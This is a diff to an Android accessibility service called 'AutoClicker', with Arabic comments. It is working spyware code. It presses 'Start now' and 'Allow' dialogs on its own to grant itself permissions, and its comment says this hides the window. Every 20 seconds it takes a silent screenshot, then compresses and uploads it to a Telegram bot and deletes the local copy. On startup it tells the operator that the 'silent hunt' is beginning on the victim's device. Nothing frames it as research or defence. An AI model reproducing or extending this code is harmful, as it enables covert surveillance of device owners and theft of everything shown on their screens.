@@ -2,11 +2,14 @@ package com.tom5.monitor;
 
 import android.accessibilityservice.AccessibilityService;
 import android.graphics.Bitmap;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.util.List;
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
 
@@ -15,58 +18,62 @@ public class AutoClicker extends AccessibilityService {
     private Executor executor = Executors.newSingleThreadExecutor();
 
     @Override
-    protected void onServiceConnected() {
-        super.onServiceConnected();
-        TelegramSender.sendMessage("✅ الخدمة اشتغلت على جهاز: " + android.os.Build.MODEL + "\nجاري بدء الصيد الصامت..");
-        
-        // حلقة التصوير (سكرين شوت كل 15 ثانية)
-        startCapturingLoop();
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        // كود ضغط "البدء الآن" تلقائياً لإخفاء النافذة في الإصدارات القديمة
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+        String[] targets = {"البدء الآن", "Start now", "بدء الآن", "START NOW", "السماح", "Allow"};
+        for (String t : targets) {
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
+            for (AccessibilityNodeInfo n : nodes) {
+                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                n.recycle();
+            }
+        }
     }
 
-    private void startCapturingLoop() {
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        TelegramSender.sendMessage("✅ الخدمة اشتغلت! جاري بدء الصيد على: " + Build.MODEL);
+        
+        // حلقة التصوير التلقائي
         handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                captureNow();
-                handler.postDelayed(this, 15000); 
+            @Override public void run() {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    takeSilentScreenshot(); // للأجهزة الحديثة
+                }
+                handler.postDelayed(this, 20000); 
             }
         }, 5000);
     }
 
-    private void captureNow() {
-        // ميزة أندرويد 11+ للسكرين شوت الصامت
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+    private void takeSilentScreenshot() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(0, executor, new TakeScreenshotCallback() {
                 @Override
                 public void onSuccess(ScreenshotResult result) {
-                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
-                    if (bitmap != null) saveAndUpload(bitmap);
+                    Bitmap b = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
+                    if (b != null) saveAndSend(b);
                 }
-                @Override public void onFailure(int errorCode) {}
+                @Override public void onFailure(int i) {}
             });
-        } else {
-            // أندرويد 9 و 10 يحتاج MediaProjection (البث) حصراً لأخذ سكرين شوت
-            TelegramSender.sendMessage("⚠️ هذا الجهاز (أندرويد 10 أو أقل) يحتاج نسخة البث لتصوير الشاشة.");
         }
     }
 
-    private void saveAndUpload(Bitmap b) {
-        executor.execute(() -> {
+    private void saveAndSend(Bitmap b) {
+        new Thread(() -> {
             try {
-                // 1. حفظ في ملف مؤقت داخل الكاش
-                File file = new File(getCacheDir(), "temp.jpg");
-                try (FileOutputStream out = new FileOutputStream(file)) {
+                File f = new File(getCacheDir(), "s.jpg");
+                try (FileOutputStream out = new FileOutputStream(f)) {
                     b.compress(Bitmap.CompressFormat.JPEG, 40, out);
-                    // 2. الرفع لتيليجرام
-                    TelegramSender.sendPhoto(file);
-                    // 3. الحذف الفوري
-                    file.delete();
+                    TelegramSender.sendPhoto(f);
+                    f.delete();
                 }
                 b.recycle();
             } catch (Exception ignored) {}
-        });
+        }).start();
     }
 
-    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
     @Override public void onInterrupt() {}
 }
